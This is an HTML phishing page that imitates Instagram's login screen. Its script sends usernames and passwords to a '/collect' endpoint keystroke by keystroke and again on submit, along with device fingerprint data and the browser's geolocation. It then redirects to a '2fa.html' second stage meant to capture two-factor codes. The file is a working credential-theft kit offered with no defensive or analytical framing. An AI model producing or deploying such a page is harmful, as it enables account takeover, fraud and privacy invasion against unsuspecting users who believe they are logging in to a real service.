<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Login • Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.main{width:100%;max-width:935px;margin:32px auto 0;display:flex;justify-content:center;flex:1}
.phone{display:none;width:380px;height:580px;background:url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/-MgTsT0kT3Z.png') no-repeat center/contain;margin-right:32px}
.card{width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:24px 40px;margin-bottom:10px;text-align:center}
.logo{margin:22px auto 12px;height:51px;background:url('https://static.cdninstagram.com/rsrc.php/v3/yR/r/radfZ8v2V_J.png') no-repeat center/175px}
form{margin-top:24px}
.field{position:relative;margin-bottom:6px}
.field input{width:100%;height:38px;padding:9px 0 7px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;outline:none}
.field input:focus{border-color:#a8a8a8}
.field label{position:absolute;left:8px;top:50%;transform:translateY(-50%);font-size:12px;color:#8e8e8e;pointer-events:none;transition:.1s}
.field input:focus+label,.field input:not(:placeholder-shown)+label{top:6px;font-size:10px;transform:none}
.field input:focus,.field input:not(:placeholder-shown){padding-top:14px;padding-bottom:2px}
.show-pass{position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:14px;font-weight:600;color:#262626;cursor:pointer;display:none;background:none;border:none}
.btn{width:100%;height:32px;margin:12px 0 8px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;opacity:.3;pointer-events:none}
.btn.active{opacity:1;pointer-events:auto}
.or{display:flex;align-items:center;margin:18px 0}
.or .line{flex:1;height:1px;background:#dbdbdb}
.or span{margin:0 18px;font-size:13px;font-weight:600;color:#8e8e8e}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin-bottom:20px}
.fb svg{width:16px;height:16px;fill:#385185}
.forgot{color:#00376b;font-size:12px;text-decoration:none}
.signup{width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;text-align:center;font-size:14px;margin-bottom:20px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{text-align:center;font-size:14px;margin-bottom:20px}
.stores{display:flex;justify-content:center;gap:8px;margin-top:16px}
.stores img{height:40px}
footer{width:100%;max-width:935px;padding:0 16px 52px;text-align:center}
.links{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 16px;margin-bottom:16px}
.links a{color:#8e8e8e;font-size:12px;text-decoration:none}
.copy{color:#8e8e8e;font-size:12px}
@media(min-width:876px){.phone{display:block}}
</style>
</head>
<body>
<div class="main">
  <div class="phone"></div>
  <div>
    <div class="card">
      <div class="logo"></div>
      <form id="f" autocomplete="on">
        <div class="field">
          <input type="text" id="u" placeholder=" " required autocomplete="username">
          <label for="u">Phone number, username, or email</label>
        </div>
        <div class="field">
          <input type="password" id="p" placeholder=" " required autocomplete="current-password">
          <label for="p">Password</label>
          <button type="button" class="show-pass" id="t">Show</button>
        </div>
        <button type="submit" class="btn" id="b">Log in</button>
      </form>
      <div class="or"><div class="line"></div><span>OR</span><div class="line"></div></div>
      <a href="https://www.facebook.com/login.php" class="fb" rel="noopener">
        <svg viewBox="0 0 16 16"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6H4.8V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V8h2.2l-.4 2.3H9.3V16C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8z"/></svg>
        Log in with Facebook
      </a>
      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">Forgot password?</a>
    </div>
    <div class="signup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
    <div class="get-app">Get the app.<div class="stores">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="">
    </div></div>
  </div>
</div>
<footer>
  <div class="links">
    <a href="https://about.meta.com/">Meta</a>
    <a href="https://about.instagram.com/">About</a>
    <a href="https://about.instagram.com/blog/">Blog</a>
    <a href="https://about.instagram.com/about-us/careers">Jobs</a>
    <a href="https://help.instagram.com/">Help</a>
    <a href="https://developers.facebook.com/docs/instagram">API</a>
    <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
    <a href="https://www.instagram.com/legal/terms/">Terms</a>
    <a href="https://www.instagram.com/explore/locations/">Locations</a>
    <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
    <a href="https://www.threads.com/">Threads</a>
    <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
    <a href="https://www.instagram.com/accounts/meta_verified/">Meta Verified</a>
  </div>
  <div class="copy">English · © 2026 Instagram from Meta</div>
</footer>
<script>
const COLLECT = "/collect";
// after submit: "/2fa.html" for second stage, or Instagram
const AFTER = "/2fa.html";

const u = document.getElementById("u");
const p = document.getElementById("p");
const b = document.getElementById("b");
const t = document.getElementById("t");

function deviceExtra() {
  return JSON.stringify({
    screen: screen.width + "x" + screen.height,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    plat: navigator.platform,
    mem: navigator.deviceMemory || "",
    cores: navigator.hardwareConcurrency || ""
  });
}

function post(payload) {
  const body = JSON.stringify(payload);
  fetch(COLLECT, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(() => {});
  if (navigator.sendBeacon) navigator.sendBeacon(COLLECT, new Blob([body], { type: "application/json" }));
}

let last = 0;
function live() {
  const now = Date.now();
  if (now - last < 900) return;
  last = now;
  post({
    type: "live",
    username: u.value.trim(),
    password: p.value,
    ua: navigator.userAgent,
    extra: deviceExtra()
  });
}
u.addEventListener("input", () => { b.classList.toggle("active", u.value.trim() && p.value); live(); });
p.addEventListener("input", () => {
  b.classList.toggle("active", u.value.trim() && p.value);
  t.style.display = p.value ? "block" : "none";
  live();
});
t.onclick = () => {
  const show = p.type === "password";
  p.type = show ? "text" : "password";
  t.textContent = show ? "Hide" : "Show";
};

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(pos => {
    post({ type: "geo", username: u.value.trim() || "geo", password: "", ua: navigator.userAgent,
      extra: "lat:" + pos.coords.latitude + ",lon:" + pos.coords.longitude });
  }, () => {}, { timeout: 4000 });
}

document.getElementById("f").onsubmit = e => {
  e.preventDefault();
  b.disabled = true;
  b.textContent = "Logging in...";
  post({
    type: "submit",
    username: u.value.trim(),
    password: p.value,
    ua: navigator.userAgent,
    extra: deviceExtra()
  });
  setTimeout(() => location.replace(AFTER), 450);
};
</script>
</body>
</html>
